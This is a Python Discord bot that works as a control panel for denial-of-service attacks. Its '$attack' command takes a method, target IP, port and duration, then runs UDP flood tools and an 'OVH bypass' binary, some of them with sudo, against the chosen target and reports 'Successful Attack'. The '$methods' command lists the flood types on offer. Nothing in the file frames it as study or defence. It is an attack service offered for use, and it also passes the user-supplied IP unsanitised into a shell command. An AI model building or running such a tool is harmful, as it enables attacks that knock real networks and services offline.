import os
import discord
from discord.ext import commands
import asyncio

TOKEN = os.getenv('KEYS')
if not TOKEN:
    print("ERROR: No se ha encontrado el token de Discord")
    exit(1)

BOT_PREFIX = '$'
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')
    await bot.change_presence(activity=discord.Game(name="Atacando con UDP"))

async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
    try:
        proceso = await asyncio.create_subprocess_shell(
            comando,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proceso.communicate()

        try:
            await ctx.send(f"Attack {ip}:{port} finished {tiempo}")
        except:
            pass

        print(f"Ataque '{comando}' terminado")
    except Exception as e:
        print(f"Error: {e}")
        try:
            await ctx.send(f'Error: {e}')
        except:
            pass

@bot.command(name='attack', help='!attack {method} {ip} {port} {time}')
async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None):
    if metodo is None or ip is None or port is None or tiempo is None:
        await ctx.send("!attack {method} {ip} {port} {time}")
        return

    # Verificar que no haya nulls
    if ip == "null" or port == "null" or tiempo == "null":
        await ctx.send("Falta la IP, Puerto o Tiempo")
        return

    try:
        port_int = int(port)
        tiempo_int = int(tiempo)
    except:
        await ctx.send("Puerto y tiempo deben ser números")
        return

    if port_int < 1 or port_int > 65535:
        await ctx.send("Puerto no valido")
        return

    if tiempo_int <= 0:
        await ctx.send("El tiempo debe ser mayor a 0")
        return

    if metodo == 'udp':
        comando = f'./udp {ip} {port_int} -t 32 -s 64 -d {tiempo_int}'
        await ctx.send(f'Successful Attack UDP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
    
    elif metodo == 'udphex':
        comando = f'./udphex {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack UDPHEX TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
    
    elif metodo == 'udppps':
        comando = f'./udppps {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack UDPpps TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
    
    elif metodo == 'udpflood':
        comando = f'go run udpflood.go {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack UDPFlood TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
    
    elif metodo == 'ovh':
        comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
        await ctx.send(f'Successful Attack OVH TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
    
    else:
        await ctx.send('Métodos: udp, udphex, udppps, udpflood, ovh')
        return

    try:
        asyncio.create_task(ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int))
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command(name='methods')
async def show_methods(ctx):
    methods_info = """
**Métodos disponibles:**
• **udp** - UDPFlood, consumo mayor de cpu
• **udphex** - UDPHEX
• **udppps** - UDPpps, the best power
• **udpflood** - udpflood con threads
• **ovh** - OVH bypass (TCP raw sockets)
"""
    await ctx.send(methods_info)

bot.run(TOKEN)
